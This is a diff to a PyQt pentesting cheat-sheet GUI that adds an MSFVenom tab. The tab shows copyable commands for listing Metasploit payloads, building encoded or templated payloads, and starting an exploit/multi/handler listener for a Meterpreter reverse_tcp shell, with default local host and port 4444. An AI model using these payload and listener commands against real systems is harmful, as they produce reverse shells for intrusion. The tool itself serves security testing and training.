@@ -19,10 +19,10 @@ class MainWindow(QMainWindow):
         self.stacked_widget = QStackedWidget()
         self.setCentralWidget(self.stacked_widget)
         self.widgets = {}
-        self.lhost = ""
+        self.lhost = "127.0.0.1"
         self.rhost = ""
-        self.rport = ""
-        self.lport = ""
+        self.rport = "-"
+        self.lport = "4444"
             
         # Create home page
         self.home_page = QWidget()
@@ -69,12 +69,14 @@ class MainWindow(QMainWindow):
         self.tab4 = QWidget()
         self.tab5 = QWidget()
         self.tab6 = QWidget()
+        self.tab7 = QWidget()
         self.tabs.addTab(self.tab1, "Initial Recon")
         self.tabs.addTab(self.tab2, "HTTPHelper")
         self.tabs.addTab(self.tab3, "Linux Priv Esc")
         self.tabs.addTab(self.tab4, "Windows Priv Esc")
         self.tabs.addTab(self.tab5, "TTY Shell Breakout")
         self.tabs.addTab(self.tab6, "RevShells")
+        self.tabs.addTab(self.tab7, "MSFVenom")
         self.tabs.currentChanged.connect(self.tabChanged)
 
         # Create a settings button
@@ -345,6 +347,7 @@ class MainWindow(QMainWindow):
         self.lhost_layout.addWidget(self.lhost_combo)
         self.lhost_layout.addWidget(self.refresh_button)
         self.lhost_layout.setAlignment(Qt.AlignLeft)
+        self.lhost_combo.setCurrentIndex(0)
         self.lhost_layout.addStretch()
         self.rhost_title_layout.addWidget(self.rhost_title)
         self.rhost_layout.addWidget(self.rhost_input)
@@ -355,6 +358,7 @@ class MainWindow(QMainWindow):
         self.rhost_layout.addStretch()
         self.rhost_layout.setAlignment(Qt.AlignLeft)
         self.rhost = self.rhost_combo.currentText()
+        self.rhost_combo.setCurrentIndex(0)
         self.rport_title_layout.addWidget(self.rport_title)
         self.rport_layout.addWidget(self.rport_input)
         self.rport_layout.addWidget(self.rport_add_button)
@@ -362,6 +366,7 @@ class MainWindow(QMainWindow):
         self.rport_layout.addWidget(self.rport_label)
         self.rport_layout.addWidget(self.rport_combo)
         self.rport_layout.setAlignment(Qt.AlignLeft)
+        self.rport_combo.setCurrentIndex(0)
         self.rport_layout.addStretch()
         self.lport_title_layout.addWidget(self.lport_title)
         self.lport_layout.addWidget(self.lport_input)
@@ -370,6 +375,7 @@ class MainWindow(QMainWindow):
         self.lport_layout.addWidget(self.lport_label)
         self.lport_layout.addWidget(self.lport_combo)
         self.lport_layout.setAlignment(Qt.AlignLeft)
+        self.lport_combo.setCurrentIndex(0)
         self.lport_layout.addStretch()
         self.popup_layout = QVBoxLayout()
         self.popup_layout.addWidget(top_spacer1)
@@ -507,6 +513,8 @@ class MainWindow(QMainWindow):
             self.tty()
         elif current_tab == 5:
             self.revShells()
+        elif current_tab == 6:
+            self.msfvenom()
 
 #### Recon
     def recon(self):
@@ -2106,7 +2114,7 @@ class MainWindow(QMainWindow):
         if hasattr(self, 'wfuzzF'):
             self.tab2_container_layout.removeWidget(self.wfuzzF)
             self.wfuzzF.deleteLater()
-        self.wfuzzF = QLabel("[+ Nikto with SSL and Evasion:]")
+        self.wfuzzF = QLabel("[+ Wfuzz Fuzz Files]")
         self.wfuzzF.setStyleSheet(
             "color: #20C20E;" +
             "font-size: 20px;" +
@@ -8563,6 +8571,2470 @@ class MainWindow(QMainWindow):
         self.tab6_container_layout.insertWidget(35, self.ps_divider2)
         self.tab6_container_layout.insertWidget(36, self.ps_spacer2)
         self.tab6_container_layout.addStretch()
+
+#### MSFVenom
+    def msfvenom(self):
+        if not hasattr(self, 'tab7_container'):
+            self.tab7_container = QWidget()
+            self.tab7_container_layout = QVBoxLayout(self.tab7_container)
+            self.tab7_container.setLayout(self.tab7_container_layout)
+            self.scroll = QScrollArea()
+            self.scroll.setWidget(self.tab7_container)
+            self.scroll.setWidgetResizable(True)
+            self.tab7_container.setSizePolicy(QSizePolicy.Expanding, QSizePolicy.Expanding)
+            self.scroll.setVerticalScrollBarPolicy(Qt.ScrollBarAlwaysOn)
+            self.tab7_container_layout.setContentsMargins(0,0,0,0)
+            self.tab7_container.adjustSize()
+            self.tab7.setLayout(QVBoxLayout())
+            self.tab7.layout().addWidget(self.scroll)
+
+        # msfv_top_spacer1
+        if hasattr(self, 'msfv_top_spacer1'):
+            self.tab7_container_layout.removeWidget(self.msfv_top_spacer1)
+            self.msfv_top_spacer1.deleteLater()
+        self.msfv_top_spacer1 = QLabel()
+        self.msfv_top_spacer1.setFixedWidth(40)
+        self.msfv_top_spacer1.setFixedHeight(50)
+     
+        # msfv_web_badchar spacer & divider layout
+        self.tab7_container_layout.insertWidget(0, self.msfv_top_spacer1)
+        self.tab7_container_layout.addStretch()
+
+    # msfv_list
+        if hasattr(self, 'msfv_list'):
+            self.tab7_container_layout.removeWidget(self.msfv_list)
+            self.msfv_list.deleteLater()
+        self.msfv_list = QLabel("[+ List Payloads ]")
+        self.msfv_list.setStyleSheet(
+            "color: #20C20E;" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+        self.tab7_container_layout.insertWidget(1,self.msfv_list)
+     
+        # msfv_list_Scan1
+        if hasattr(self, 'msfv_list_Scan1'):
+            self.tab7_container_layout.removeWidget(self.msfv_list_Scan1)
+            self.msfv_list_Scan1.deleteLater()
+        self.msfv_list_Scan1 = QLabel("msfvenom -l payloads")
+        self.msfv_list_Scan1.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+        self.tab7_container_layout.insertWidget(2,self.msfv_list_Scan1)
+     
+        # msfv_list_Scan1_Copy
+        if hasattr(self, 'msfv_list_Scan1_Copy'):
+            self.tab7_container_layout.removeWidget(self.msfv_list_Scan1_Copy)
+            self.msfv_list_Scan1_Copy.deleteLater()
+        self.msfv_list_Scan1_Copy = QPushButton()
+        self.msfv_list_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
+        self.msfv_list_Scan1_Copy.setFixedSize(QSize(20,20))
+        self.msfv_list_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.msfv_list_Scan1.text()))
+        self.msfv_list_Scan1_Copy.setStyleSheet(
+            "*:hover{background: '#20C20E';}"
+        )
+     
+        # msfv_list_Scan1 adding Widgets
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(self.msfv_list_Scan1_Copy)
+        label_layout.addWidget(self.msfv_list_Scan1)
+        self.tab7_container_layout.insertLayout(3, label_layout)
+        self.tab7_container_layout.addStretch()
+     
+        # msfv_list_divider1
+        if hasattr(self, 'msfv_list_divider1'):
+            self.tab7_container_layout.removeWidget(self.msfv_list_divider1)
+            self.msfv_list_divider1.deleteLater()
+        self.msfv_list_divider1 = QFrame()
+        self.msfv_list_divider1.setFrameShape(QFrame.HLine)
+        self.msfv_list_divider1.setLineWidth(3)
+        self.msfv_list_divider1.setStyleSheet("color: #20C20E;")
+     
+        # msfv_list_divider2
+        if hasattr(self, 'msfv_list_divider2'):
+            self.tab7_container_layout.removeWidget(self.msfv_list_divider2)
+            self.msfv_list_divider2.deleteLater()
+        self.msfv_list_divider2 = QFrame()
+        self.msfv_list_divider2.setFrameShape(QFrame.HLine)
+        self.msfv_list_divider2.setLineWidth(3)
+        self.msfv_list_divider2.setStyleSheet("color: #20C20E;")
+     
+        # msfv_list_spacer1
+        if hasattr(self, 'msfv_list_spacer1'):
+            self.tab7_container_layout.removeWidget(self.msfv_list_spacer1)
+            self.msfv_list_spacer1.deleteLater()
+        self.msfv_list_spacer1 = QLabel()
+        self.msfv_list_spacer1.setFixedWidth(40)
+        self.msfv_list_spacer1.setFixedHeight(50)
+     
+        # msfv_list_spacer2
+        if hasattr(self, 'msfv_list_spacer2'):
+            self.tab7_container_layout.removeWidget(self.msfv_list_spacer2)
+            self.msfv_list_spacer2.deleteLater()
+        self.msfv_list_spacer2 = QLabel()
+        self.msfv_list_spacer2.setFixedWidth(40)
+        self.msfv_list_spacer2.setFixedHeight(50)
+     
+        # msfv_list spacer & divider layout
+        self.tab7_container_layout.insertWidget(4, self.msfv_list_spacer1)
+        self.tab7_container_layout.insertWidget(5, self.msfv_list_divider1)
+        self.tab7_container_layout.insertWidget(6, self.msfv_list_divider2)
+        self.tab7_container_layout.insertWidget(7, self.msfv_list_spacer2)
+        self.tab7_container_layout.addStretch()
+     
+    # msfv_options
+        if hasattr(self, 'msfv_options'):
+            self.tab7_container_layout.removeWidget(self.msfv_options)
+            self.msfv_options.deleteLater()
+        self.msfv_options = QLabel("[+ View Payload Options ]")
+        self.msfv_options.setStyleSheet(
+            "color: #20C20E;" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+        self.tab7_container_layout.insertWidget(8,self.msfv_options)
+     
+        # msfv_options_Scan1
+        if hasattr(self, 'msfv_options_Scan1'):
+            self.tab7_container_layout.removeWidget(self.msfv_options_Scan1)
+            self.msfv_options_Scan1.deleteLater()
+        self.msfv_options_Scan1 = QLabel("msfvenom -p windows/x64/meterpreter_reverse_tcp --list-options")
+        self.msfv_options_Scan1.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+        self.tab7_container_layout.insertWidget(9,self.msfv_options_Scan1)
+     
+        # msfv_options_Scan1_Copy
+        if hasattr(self, 'msfv_options_Scan1_Copy'):
+            self.tab7_container_layout.removeWidget(self.msfv_options_Scan1_Copy)
+            self.msfv_options_Scan1_Copy.deleteLater()
+        self.msfv_options_Scan1_Copy = QPushButton()
+        self.msfv_options_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
+        self.msfv_options_Scan1_Copy.setFixedSize(QSize(20,20))
+        self.msfv_options_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.msfv_options_Scan1.text()))
+        self.msfv_options_Scan1_Copy.setStyleSheet(
+            "*:hover{background: '#20C20E';}"
+        )
+     
+        # msfv_options_Scan1 adding Widgets
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(self.msfv_options_Scan1_Copy)
+        label_layout.addWidget(self.msfv_options_Scan1)
+        self.tab7_container_layout.insertLayout(10, label_layout)
+        self.tab7_container_layout.addStretch()
+     
+        # msfv_options_divider1
+        if hasattr(self, 'msfv_options_divider1'):
+            self.tab7_container_layout.removeWidget(self.msfv_options_divider1)
+            self.msfv_options_divider1.deleteLater()
+        self.msfv_options_divider1 = QFrame()
+        self.msfv_options_divider1.setFrameShape(QFrame.HLine)
+        self.msfv_options_divider1.setLineWidth(3)
+        self.msfv_options_divider1.setStyleSheet("color: #20C20E;")
+     
+        # msfv_options_divider2
+        if hasattr(self, 'msfv_options_divider2'):
+            self.tab7_container_layout.removeWidget(self.msfv_options_divider2)
+            self.msfv_options_divider2.deleteLater()
+        self.msfv_options_divider2 = QFrame()
+        self.msfv_options_divider2.setFrameShape(QFrame.HLine)
+        self.msfv_options_divider2.setLineWidth(3)
+        self.msfv_options_divider2.setStyleSheet("color: #20C20E;")
+     
+        # msfv_options_spacer1
+        if hasattr(self, 'msfv_options_spacer1'):
+            self.tab7_container_layout.removeWidget(self.msfv_options_spacer1)
+            self.msfv_options_spacer1.deleteLater()
+        self.msfv_options_spacer1 = QLabel()
+        self.msfv_options_spacer1.setFixedWidth(40)
+        self.msfv_options_spacer1.setFixedHeight(50)
+     
+        # msfv_options_spacer2
+        if hasattr(self, 'msfv_options_spacer2'):
+            self.tab7_container_layout.removeWidget(self.msfv_options_spacer2)
+            self.msfv_options_spacer2.deleteLater()
+        self.msfv_options_spacer2 = QLabel()
+        self.msfv_options_spacer2.setFixedWidth(40)
+        self.msfv_options_spacer2.setFixedHeight(50)
+     
+        # msfv_options spacer & divider layout
+        self.tab7_container_layout.insertWidget(11, self.msfv_options_spacer1)
+        self.tab7_container_layout.insertWidget(12, self.msfv_options_divider1)
+        self.tab7_container_layout.insertWidget(13, self.msfv_options_divider2)
+        self.tab7_container_layout.insertWidget(14, self.msfv_options_spacer2)
+        self.tab7_container_layout.addStretch()
+     
+    # msfv_basic
+        if hasattr(self, 'msfv_basic'):
+            self.tab7_container_layout.removeWidget(self.msfv_basic)
+            self.msfv_basic.deleteLater()
+        self.msfv_basic = QLabel("[+ Creating a Payload ]")
+        self.msfv_basic.setStyleSheet(
+            "color: #20C20E;" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+        self.tab7_container_layout.insertWidget(15,self.msfv_basic)
+     
+        # msfv_basic_Scan1
+        if hasattr(self, 'msfv_basic_Scan1'):
+            self.tab7_container_layout.removeWidget(self.msfv_basic_Scan1)
+            self.msfv_basic_Scan1.deleteLater()
+        self.msfv_basic_Scan1 = QLabel("msfvenom -p [payload] LHOST=" + self.lhost + " LPORT=" + self.lport + "")
+        self.msfv_basic_Scan1.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+        self.tab7_container_layout.insertWidget(16,self.msfv_basic_Scan1)
+     
+        # msfv_basic_Scan1_Copy
+        if hasattr(self, 'msfv_basic_Scan1_Copy'):
+            self.tab7_container_layout.removeWidget(self.msfv_basic_Scan1_Copy)
+            self.msfv_basic_Scan1_Copy.deleteLater()
+        self.msfv_basic_Scan1_Copy = QPushButton()
+        self.msfv_basic_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
+        self.msfv_basic_Scan1_Copy.setFixedSize(QSize(20,20))
+        self.msfv_basic_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.msfv_basic_Scan1.text()))
+        self.msfv_basic_Scan1_Copy.setStyleSheet(
+            "*:hover{background: '#20C20E';}"
+        )
+     
+        # msfv_basic_Scan1 adding Widgets
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(self.msfv_basic_Scan1_Copy)
+        label_layout.addWidget(self.msfv_basic_Scan1)
+        self.tab7_container_layout.insertLayout(17, label_layout)
+        self.tab7_container_layout.addStretch()
+     
+        # msfv_basic_divider1
+        if hasattr(self, 'msfv_basic_divider1'):
+            self.tab7_container_layout.removeWidget(self.msfv_basic_divider1)
+            self.msfv_basic_divider1.deleteLater()
+        self.msfv_basic_divider1 = QFrame()
+        self.msfv_basic_divider1.setFrameShape(QFrame.HLine)
+        self.msfv_basic_divider1.setLineWidth(3)
+        self.msfv_basic_divider1.setStyleSheet("color: #20C20E;")
+     
+        # msfv_basic_divider2
+        if hasattr(self, 'msfv_basic_divider2'):
+            self.tab7_container_layout.removeWidget(self.msfv_basic_divider2)
+            self.msfv_basic_divider2.deleteLater()
+        self.msfv_basic_divider2 = QFrame()
+        self.msfv_basic_divider2.setFrameShape(QFrame.HLine)
+        self.msfv_basic_divider2.setLineWidth(3)
+        self.msfv_basic_divider2.setStyleSheet("color: #20C20E;")
+     
+        # msfv_basic_spacer1
+        if hasattr(self, 'msfv_basic_spacer1'):
+            self.tab7_container_layout.removeWidget(self.msfv_basic_spacer1)
+            self.msfv_basic_spacer1.deleteLater()
+        self.msfv_basic_spacer1 = QLabel()
+        self.msfv_basic_spacer1.setFixedWidth(40)
+        self.msfv_basic_spacer1.setFixedHeight(50)
+     
+        # msfv_basic_spacer2
+        if hasattr(self, 'msfv_basic_spacer2'):
+            self.tab7_container_layout.removeWidget(self.msfv_basic_spacer2)
+            self.msfv_basic_spacer2.deleteLater()
+        self.msfv_basic_spacer2 = QLabel()
+        self.msfv_basic_spacer2.setFixedWidth(40)
+        self.msfv_basic_spacer2.setFixedHeight(50)
+     
+        # msfv_basic spacer & divider layout
+        self.tab7_container_layout.insertWidget(18, self.msfv_basic_spacer1)
+        self.tab7_container_layout.insertWidget(19, self.msfv_basic_divider1)
+        self.tab7_container_layout.insertWidget(20, self.msfv_basic_divider2)
+        self.tab7_container_layout.insertWidget(21, self.msfv_basic_spacer2)
+        self.tab7_container_layout.addStretch()
+     
+    # msfv_encode
+        if hasattr(self, 'msfv_encode'):
+            self.tab7_container_layout.removeWidget(self.msfv_encode)
+            self.msfv_encode.deleteLater()
+        self.msfv_encode = QLabel("[+ Creating a payload with encoding ]")
+        self.msfv_encode.setStyleSheet(
+            "color: #20C20E;" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+        self.tab7_container_layout.insertWidget(22,self.msfv_encode)
+     
+        # msfv_encode_Scan1
+        if hasattr(self, 'msfv_encode_Scan1'):
+            self.tab7_container_layout.removeWidget(self.msfv_encode_Scan1)
+            self.msfv_encode_Scan1.deleteLater()
+        self.msfv_encode_Scan1 = QLabel("msfvenom -p [payload] -e [encoder] -f [formattype] -i [iteration] <var=value> > outputfile")
+        self.msfv_encode_Scan1.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+        self.tab7_container_layout.insertWidget(23,self.msfv_encode_Scan1)
+     
+        # msfv_encode_Scan1_Copy
+        if hasattr(self, 'msfv_encode_Scan1_Copy'):
+            self.tab7_container_layout.removeWidget(self.msfv_encode_Scan1_Copy)
+            self.msfv_encode_Scan1_Copy.deleteLater()
+        self.msfv_encode_Scan1_Copy = QPushButton()
+        self.msfv_encode_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
+        self.msfv_encode_Scan1_Copy.setFixedSize(QSize(20,20))
+        self.msfv_encode_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.msfv_encode_Scan1.text()))
+        self.msfv_encode_Scan1_Copy.setStyleSheet(
+            "*:hover{background: '#20C20E';}"
+        )
+     
+        # msfv_encode_Scan1 adding Widgets
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(self.msfv_encode_Scan1_Copy)
+        label_layout.addWidget(self.msfv_encode_Scan1)
+        self.tab7_container_layout.insertLayout(24, label_layout)
+        self.tab7_container_layout.addStretch()
+     
+        # msfv_encode_divider1
+        if hasattr(self, 'msfv_encode_divider1'):
+            self.tab7_container_layout.removeWidget(self.msfv_encode_divider1)
+            self.msfv_encode_divider1.deleteLater()
+        self.msfv_encode_divider1 = QFrame()
+        self.msfv_encode_divider1.setFrameShape(QFrame.HLine)
+        self.msfv_encode_divider1.setLineWidth(3)
+        self.msfv_encode_divider1.setStyleSheet("color: #20C20E;")
+     
+        # msfv_encode_divider2
+        if hasattr(self, 'msfv_encode_divider2'):
+            self.tab7_container_layout.removeWidget(self.msfv_encode_divider2)
+            self.msfv_encode_divider2.deleteLater()
+        self.msfv_encode_divider2 = QFrame()
+        self.msfv_encode_divider2.setFrameShape(QFrame.HLine)
+        self.msfv_encode_divider2.setLineWidth(3)
+        self.msfv_encode_divider2.setStyleSheet("color: #20C20E;")
+     
+        # msfv_encode_spacer1
+        if hasattr(self, 'msfv_encode_spacer1'):
+            self.tab7_container_layout.removeWidget(self.msfv_encode_spacer1)
+            self.msfv_encode_spacer1.deleteLater()
+        self.msfv_encode_spacer1 = QLabel()
+        self.msfv_encode_spacer1.setFixedWidth(40)
+        self.msfv_encode_spacer1.setFixedHeight(50)
+     
+        # msfv_encode_spacer2
+        if hasattr(self, 'msfv_encode_spacer2'):
+            self.tab7_container_layout.removeWidget(self.msfv_encode_spacer2)
+            self.msfv_encode_spacer2.deleteLater()
+        self.msfv_encode_spacer2 = QLabel()
+        self.msfv_encode_spacer2.setFixedWidth(40)
+        self.msfv_encode_spacer2.setFixedHeight(50)
+     
+        # msfv_encode spacer & divider layout
+        self.tab7_container_layout.insertWidget(25, self.msfv_encode_spacer1)
+        self.tab7_container_layout.insertWidget(26, self.msfv_encode_divider1)
+        self.tab7_container_layout.insertWidget(27, self.msfv_encode_divider2)
+        self.tab7_container_layout.insertWidget(28, self.msfv_encode_spacer2)
+        self.tab7_container_layout.addStretch()
+     
+    # msfv_template
+        if hasattr(self, 'msfv_template'):
+            self.tab7_container_layout.removeWidget(self.msfv_template)
+            self.msfv_template.deleteLater()
+        self.msfv_template = QLabel("[+ Creating a payload using a template ]")
+        self.msfv_template.setStyleSheet(
+            "color: #20C20E;" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+        self.tab7_container_layout.insertWidget(29,self.msfv_template)
+     
+        # msfv_template_Scan1
+        if hasattr(self, 'msfv_template_Scan1'):
+            self.tab7_container_layout.removeWidget(self.msfv_template_Scan1)
+            self.msfv_template_Scan1.deleteLater()
+        self.msfv_template_Scan1 = QLabel("msfvenom -p [payload] <var=value> -x [template] -f [formattype] > outputfile")
+        self.msfv_template_Scan1.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+        self.tab7_container_layout.insertWidget(30,self.msfv_template_Scan1)
+     
+        # msfv_template_Scan1_Copy
+        if hasattr(self, 'msfv_template_Scan1_Copy'):
+            self.tab7_container_layout.removeWidget(self.msfv_template_Scan1_Copy)
+            self.msfv_template_Scan1_Copy.deleteLater()
+        self.msfv_template_Scan1_Copy = QPushButton()
+        self.msfv_template_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
+        self.msfv_template_Scan1_Copy.setFixedSize(QSize(20,20))
+        self.msfv_template_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.msfv_template_Scan1.text()))
+        self.msfv_template_Scan1_Copy.setStyleSheet(
+            "*:hover{background: '#20C20E';}"
+        )
+     
+        # msfv_template_Scan1 adding Widgets
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(self.msfv_template_Scan1_Copy)
+        label_layout.addWidget(self.msfv_template_Scan1)
+        self.tab7_container_layout.insertLayout(31, label_layout)
+        self.tab7_container_layout.addStretch()
+     
+        # msfv_template_divider1
+        if hasattr(self, 'msfv_template_divider1'):
+            self.tab7_container_layout.removeWidget(self.msfv_template_divider1)
+            self.msfv_template_divider1.deleteLater()
+        self.msfv_template_divider1 = QFrame()
+        self.msfv_template_divider1.setFrameShape(QFrame.HLine)
+        self.msfv_template_divider1.setLineWidth(3)
+        self.msfv_template_divider1.setStyleSheet("color: #20C20E;")
+     
+        # msfv_template_divider2
+        if hasattr(self, 'msfv_template_divider2'):
+            self.tab7_container_layout.removeWidget(self.msfv_template_divider2)
+            self.msfv_template_divider2.deleteLater()
+        self.msfv_template_divider2 = QFrame()
+        self.msfv_template_divider2.setFrameShape(QFrame.HLine)
+        self.msfv_template_divider2.setLineWidth(3)
+        self.msfv_template_divider2.setStyleSheet("color: #20C20E;")
+     
+        # msfv_template_spacer1
+        if hasattr(self, 'msfv_template_spacer1'):
+            self.tab7_container_layout.removeWidget(self.msfv_template_spacer1)
+            self.msfv_template_spacer1.deleteLater()
+        self.msfv_template_spacer1 = QLabel()
+        self.msfv_template_spacer1.setFixedWidth(40)
+        self.msfv_template_spacer1.setFixedHeight(50)
+     
+        # msfv_template_spacer2
+        if hasattr(self, 'msfv_template_spacer2'):
+            self.tab7_container_layout.removeWidget(self.msfv_template_spacer2)
+            self.msfv_template_spacer2.deleteLater()
+        self.msfv_template_spacer2 = QLabel()
+        self.msfv_template_spacer2.setFixedWidth(40)
+        self.msfv_template_spacer2.setFixedHeight(50)
+     
+        # msfv_template spacer & divider layout
+        self.tab7_container_layout.insertWidget(32, self.msfv_template_spacer1)
+        self.tab7_container_layout.insertWidget(33, self.msfv_template_divider1)
+        self.tab7_container_layout.insertWidget(34, self.msfv_template_divider2)
+        self.tab7_container_layout.insertWidget(35, self.msfv_template_spacer2)
+        self.tab7_container_layout.addStretch()
+     
+    # msfv_listener
+        if hasattr(self, 'msfv_listener'):
+            self.tab7_container_layout.removeWidget(self.msfv_listener)
+            self.msfv_listener.deleteLater()
+        self.msfv_listener = QLabel("[+ Listening for MSfvenom Payloads (from msframework) ]")
+        self.msfv_listener.setStyleSheet(
+            "color: #20C20E;" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+        self.tab7_container_layout.insertWidget(36,self.msfv_listener)
+     
+        # msfv_listener_Scan1
+        if hasattr(self, 'msfv_listener_Scan1'):
+            self.tab7_container_layout.removeWidget(self.msfv_listener_Scan1)
+            self.msfv_listener_Scan1.deleteLater()
+        self.msfv_listener_Scan1 = QLabel("use exploit/multi/handler")
+        self.msfv_listener_Scan1.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+        self.tab7_container_layout.insertWidget(37,self.msfv_listener_Scan1)
+     
+        # msfv_listener_Scan1_Copy
+        if hasattr(self, 'msfv_listener_Scan1_Copy'):
+            self.tab7_container_layout.removeWidget(self.msfv_listener_Scan1_Copy)
+            self.msfv_listener_Scan1_Copy.deleteLater()
+        self.msfv_listener_Scan1_Copy = QPushButton()
+        self.msfv_listener_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
+        self.msfv_listener_Scan1_Copy.setFixedSize(QSize(20,20))
+        self.msfv_listener_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.msfv_listener_Scan1.text()))
+        self.msfv_listener_Scan1_Copy.setStyleSheet(
+            "*:hover{background: '#20C20E';}"
+        )
+     
+        # msfv_listener_Scan1 adding Widgets
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(self.msfv_listener_Scan1_Copy)
+        label_layout.addWidget(self.msfv_listener_Scan1)
+        self.tab7_container_layout.insertLayout(38, label_layout)
+        self.tab7_container_layout.addStretch()
+     
+        # msfv_listener_divider1
+        if hasattr(self, 'msfv_listener_divider1'):
+            self.tab7_container_layout.removeWidget(self.msfv_listener_divider1)
+            self.msfv_listener_divider1.deleteLater()
+        self.msfv_listener_divider1 = QFrame()
+        self.msfv_listener_divider1.setFrameShape(QFrame.HLine)
+        self.msfv_listener_divider1.setLineWidth(3)
+        self.msfv_listener_divider1.setStyleSheet("color: #20C20E;")
+     
+        # msfv_listener_divider2
+        if hasattr(self, 'msfv_listener_divider2'):
+            self.tab7_container_layout.removeWidget(self.msfv_listener_divider2)
+            self.msfv_listener_divider2.deleteLater()
+        self.msfv_listener_divider2 = QFrame()
+        self.msfv_listener_divider2.setFrameShape(QFrame.HLine)
+        self.msfv_listener_divider2.setLineWidth(3)
+        self.msfv_listener_divider2.setStyleSheet("color: #20C20E;")
+     
+        # msfv_listener_spacer1
+        if hasattr(self, 'msfv_listener_spacer1'):
+            self.tab7_container_layout.removeWidget(self.msfv_listener_spacer1)
+            self.msfv_listener_spacer1.deleteLater()
+        self.msfv_listener_spacer1 = QLabel()
+        self.msfv_listener_spacer1.setFixedWidth(40)
+        self.msfv_listener_spacer1.setFixedHeight(50)
+     
+        # msfv_listener_spacer2
+        if hasattr(self, 'msfv_listener_spacer2'):
+            self.tab7_container_layout.removeWidget(self.msfv_listener_spacer2)
+            self.msfv_listener_spacer2.deleteLater()
+        self.msfv_listener_spacer2 = QLabel()
+        self.msfv_listener_spacer2.setFixedWidth(40)
+        self.msfv_listener_spacer2.setFixedHeight(50)
+     
+        # msfv_listener spacer & divider layout
+        self.tab7_container_layout.insertWidget(39, self.msfv_listener_spacer1)
+        self.tab7_container_layout.insertWidget(40, self.msfv_listener_divider1)
+        self.tab7_container_layout.insertWidget(41, self.msfv_listener_divider2)
+        self.tab7_container_layout.insertWidget(42, self.msfv_listener_spacer2)
+        self.tab7_container_layout.addStretch()
+     
+        # msfv_listener_Scan2
+        if hasattr(self, 'msfv_listener_Scan2'):
+            self.tab7_container_layout.removeWidget(self.msfv_listener_Scan2)
+            self.msfv_listener_Scan2.deleteLater()
+        self.msfv_listener_Scan2 = QLabel("set payload windows/meterpreter/reverse_tcp")
+        self.msfv_listener_Scan2.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+        self.tab7_container_layout.insertWidget(43,self.msfv_listener_Scan2)
+     
+        # msfv_listener_Scan2_Copy
+        if hasattr(self, 'msfv_listener_Scan2_Copy'):
+            self.tab7_container_layout.removeWidget(self.msfv_listener_Scan2_Copy)
+            self.msfv_listener_Scan2_Copy.deleteLater()
+        self.msfv_listener_Scan2_Copy = QPushButton()
+        self.msfv_listener_Scan2_Copy.setIcon(QIcon.fromTheme("edit-copy"))
+        self.msfv_listener_Scan2_Copy.setFixedSize(QSize(20,20))
+        self.msfv_listener_Scan2_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.msfv_listener_Scan2.text()))
+        self.msfv_listener_Scan2_Copy.setStyleSheet(
+            "*:hover{background: '#20C20E';}"
+        )
+     
+        # msfv_listener_Scan2 adding Widgets
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(self.msfv_listener_Scan2_Copy)
+        label_layout.addWidget(self.msfv_listener_Scan2)
+        self.tab7_container_layout.insertLayout(44, label_layout)
+        self.tab7_container_layout.addStretch()
+     
+        # msfv_listener_divider1
+        if hasattr(self, 'msfv_listener_divider1'):
+            self.tab7_container_layout.removeWidget(self.msfv_listener_divider1)
+            self.msfv_listener_divider1.deleteLater()
+        self.msfv_listener_divider1 = QFrame()
+        self.msfv_listener_divider1.setFrameShape(QFrame.HLine)
+        self.msfv_listener_divider1.setLineWidth(3)
+        self.msfv_listener_divider1.setStyleSheet("color: #20C20E;")
+     
+        # msfv_listener_divider2
+        if hasattr(self, 'msfv_listener_divider2'):
+            self.tab7_container_layout.removeWidget(self.msfv_listener_divider2)
+            self.msfv_listener_divider2.deleteLater()
+        self.msfv_listener_divider2 = QFrame()
+        self.msfv_listener_divider2.setFrameShape(QFrame.HLine)
+        self.msfv_listener_divider2.setLineWidth(3)
+        self.msfv_listener_divider2.setStyleSheet("color: #20C20E;")
+     
+        # msfv_listener_spacer1
+        if hasattr(self, 'msfv_listener_spacer1'):
+            self.tab7_container_layout.removeWidget(self.msfv_listener_spacer1)
+            self.msfv_listener_spacer1.deleteLater()
+        self.msfv_listener_spacer1 = QLabel()
+        self.msfv_listener_spacer1.setFixedWidth(40)
+        self.msfv_listener_spacer1.setFixedHeight(50)
+     
+        # msfv_listener_spacer2
+        if hasattr(self, 'msfv_listener_spacer2'):
+            self.tab7_container_layout.removeWidget(self.msfv_listener_spacer2)
+            self.msfv_listener_spacer2.deleteLater()
